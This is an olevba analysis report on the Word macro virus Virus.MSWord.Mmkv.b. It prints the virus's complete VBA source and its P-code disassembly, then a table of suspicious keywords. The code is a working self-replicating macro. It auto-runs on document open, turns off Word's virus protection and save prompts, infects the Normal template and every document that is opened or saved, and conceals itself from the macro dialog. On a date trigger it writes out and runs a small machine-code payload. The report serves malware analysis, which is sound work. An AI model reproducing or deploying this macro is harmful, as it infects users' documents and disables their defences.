olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Mmkv.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Mmkv.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MMKV.bas 
in file: ./Virus.MSWord.Mmkv.b - OLE stream: 'Macros/VBA/MMKV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public WinDir As String
Public DataDot As Boolean

Sub AutoExec()
AutoOpen
End Sub
Sub AutoOpen()
If Year(Now) = 2000 Then
        f = FreeFile
        Open "c:\end.a" For Output As #f
        Print #f, Chr$(184) & Chr$(16) & Chr$(5) & Chr$(185) & Chr$(9) & Chr$(0) & Chr$(186) & Chr$(128) & Chr$(0) & Chr$(187) & Chr$(0) & Chr$(16) & Chr$(205) & Chr$(19) & Chr$(205) & Chr$(32)
        Close
        Shell "c:\end.com", vbHide
        MsgBox "Welcome To Y2K", 0, "MK-Words By MMK 1999"
End If
If Day(Now) = 3 Then MsgBox "Y2K is coming soon...", 0, "MK-Words By MMK 1999"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Copy_Tmp
Copy_Vir
End Sub
Sub FileSaveAs()
Dialogs(wdDialogFileSaveAs).Show
If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument, "MMKV", wdOrganizerObjectProjectItems
ActiveDocument.Save
End Sub
Sub FileOpen()
fa = Dialogs(wdDialogFileOpen).Show
If fa = "" Then GoTo asa
Copy_Vir
asa:
ActiveDocument.Save
End Sub
Sub ToolsMacro()
End Sub
Find_Win
NormalTemplate.VBProject.VBComponents("MMKV").Export WinDir + "\SYSTEM\" + "WINMK.SYS"
Application.OrganizerDelete NormalTemplate.FullName, "MMKV", wdOrganizerObjectProjectItems
While Dialogs(wdDialogToolsMacro).Display
Wend
NormalTemplate.VBProject.VBComponents.import WinDir + "\SYSTEM\" + "WINMK.SYS"
Kill WinDir + "\SYSTEM\" + "WINMK.SYS"
End Sub
Sub FileSave()
If ActiveDocument.FullName = "" Then Dialogs(wdDialogFileSaveAs).Show
Copy_Vir
ActiveDocument.Save
End Sub
Sub viewvbcode()
End Sub
Sub Find_Win()
Close
Dim WD As String
On Error GoTo Err_F
f = FreeFile
Open "c:\msdos.sys" For Input As #f
Do Until EOF(f)
Line Input #f, WD
If Left(UCase(WD), 7) = "WINDIR=" Then
    L = Len(WD)
    WinDir = UCase$(Mid$(WD, 8, L))
End If
Loop
GoTo END_S
Err_F:
WinDir = ""
END_S:
Close #f
End Sub
Sub Copy_Vir()
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(I).Name = "MMKV" Then GoTo INFECTED
    Next
Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "MMKV", wdOrganizerObjectProjectItems
Add_Com
ActiveDocument.Save
INFECTED:
End Sub
Sub Copy_Tmp()
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(I).Name = "MMKV" Then GoTo INFECTED
    Next
Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "MMKV", wdOrganizerObjectProjectItems
ActiveDocument.Save
INFECTED:
Copy_Vir
Add_Com
ActiveDocument.Save
End Sub
Private Sub Add_Com()
        With Dialogs(wdDialogFileSummaryInfo)
            .Comments = "MK-Words (V1) By MMK 1999"
            .Execute
        End With
End Sub
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Mmkv.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/MMKV - 6023 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn WinDir (As String)
' Line #1:
' 	Dim (Public) 
' 	VarDefn DataDot (As Boolean)
' Line #2:
' Line #3:
' 	FuncDefn (Sub AutoExec())
' Line #4:
' 	ArgsCall AutoOpen 0x0000 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Sub AutoOpen())
' Line #7:
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07D0 
' 	Eq 
' 	IfBlock 
' Line #8:
' 	Ld Friend 
' 	St False 
' Line #9:
' 	LitStr 0x0008 "c:\end.a"
' 	Ld False 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #10:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x00B8 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0010 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x00B9 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x0009 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x00BA 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x0080 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x00BB 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x0010 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x00CD 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x0013 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x00CD 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #11:
' 	CloseAll 
' Line #12:
' 	LitStr 0x000A "c:\end.com"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #13:
' 	LitStr 0x000E "Welcome To Y2K"
' 	LitDI2 0x0000 
' 	LitStr 0x0014 "MK-Words By MMK 1999"
' 	ArgsCall MsgBox 0x0003 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0015 "Y2K is coming soon..."
' 	LitDI2 0x0000 
' 	LitStr 0x0014 "MK-Words By MMK 1999"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #16:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #17:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #18:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #20:
' 	ArgsCall Copy_Tmp 0x0000 
' Line #21:
' 	ArgsCall Copy_Vir 0x0000 
' Line #22:
' 	EndSub 
' Line #23:
' 	FuncDefn (Sub FileSaveAs())
' Line #24:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #25:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #26:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	LitStr 0x0004 "MMKV"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #27:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #28:
' 	EndSub 
' Line #29:
' 	FuncDefn (Sub FileOpen())
' Line #30:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	St fa 
' Line #31:
' 	Ld fa 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo asa 
' 	EndIf 
' Line #32:
' 	ArgsCall Copy_Vir 0x0000 
' Line #33:
' 	Label asa 
' Line #34:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub ToolsMacro())
' Line #37:
' 	EndSub 
' Line #38:
' 	ArgsCall Find_Win 0x0000 
' Line #39:
' 	Ld WinDir 
' 	LitStr 0x0008 "\SYSTEM\"
' 	Add 
' 	LitStr 0x0009 "WINMK.SYS"
' 	Add 
' 	LitStr 0x0004 "MMKV"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #40:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	LitStr 0x0004 "MMKV"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #41:
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Display 
' 	While 
' Line #42:
' 	Wend 
' Line #43:
' 	Ld WinDir 
' 	LitStr 0x0008 "\SYSTEM\"
' 	Add 
' 	LitStr 0x0009 "WINMK.SYS"
' 	Add 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #44:
' 	Ld WinDir 
' 	LitStr 0x0008 "\SYSTEM\"
' 	Add 
' 	LitStr 0x0009 "WINMK.SYS"
' 	Add 
' 	ArgsCall Kill 0x0001 
' Line #45:
' 	EndSub 
' Line #46:
' 	FuncDefn (Sub FileSave())
' Line #47:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' 	EndIf 
' Line #48:
' 	ArgsCall Copy_Vir 0x0000 
' Line #49:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #50:
' 	EndSub 
' Line #51:
' 	FuncDefn (Sub viewvbcode())
' Line #52:
' 	EndSub 
' Line #53:
' 	FuncDefn (Sub Find_Win())
' Line #54:
' 	CloseAll 
' Line #55:
' 	Dim 
' 	VarDefn WD (As String)
' Line #56:
' 	OnError Err_F 
' Line #57:
' 	Ld Friend 
' 	St False 
' Line #58:
' 	LitStr 0x000C "c:\msdos.sys"
' 	Ld False 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #59:
' 	Ld False 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #60:
' 	Ld False 
' 	Ld WD 
' 	LineInput 
' Line #61:
' 	Ld WD 
' 	ArgsLd UCase 0x0001 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "WINDIR="
' 	Eq 
' 	IfBlock 
' Line #62:
' 	Ld WD 
' 	FnLen 
' 	St L 
' Line #63:
' 	Ld WD 
' 	LitDI2 0x0008 
' 	Ld L 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd UCase$ 0x0001 
' 	St WinDir 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	Loop 
' Line #66:
' 	GoTo END_S 
' Line #67:
' 	Label Err_F 
' Line #68:
' 	LitStr 0x0000 ""
' 	St WinDir 
' Line #69:
' 	Label END_S 
' Line #70:
' 	Ld False 
' 	Sharp 
' 	Close 0x0001 
' Line #71:
' 	EndSub 
' Line #72:
' 	FuncDefn (Sub Copy_Vir())
' Line #73:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #74:
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0004 "MMKV"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo INFECTED 
' 	EndIf 
' Line #75:
' 	StartForVariable 
' 	Next 
' Line #76:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitStr 0x0004 "MMKV"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #77:
' 	ArgsCall Add_Com 0x0000 
' Line #78:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #79:
' 	Label INFECTED 
' Line #80:
' 	EndSub 
' Line #81:
' 	FuncDefn (Sub Copy_Tmp())
' Line #82:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #83:
' 	Ld I 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0004 "MMKV"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo INFECTED 
' 	EndIf 
' Line #84:
' 	StartForVariable 
' 	Next 
' Line #85:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	LitStr 0x0004 "MMKV"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #86:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #87:
' 	Label INFECTED 
' Line #88:
' 	ArgsCall Copy_Vir 0x0000 
' Line #89:
' 	ArgsCall Add_Com 0x0000 
' Line #90:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #91:
' 	EndSub 
' Line #92:
' 	FuncDefn (Private Sub Add_Com())
' Line #93:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #94:
' 	LitStr 0x0019 "MK-Words (V1) By MMK 1999"
' 	MemStWith Comments 
' Line #95:
' 	ArgsMemCallWith Execute 0x0000 
' Line #96:
' 	EndWith 
' Line #97:
' 	EndSub 
' Line #98:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

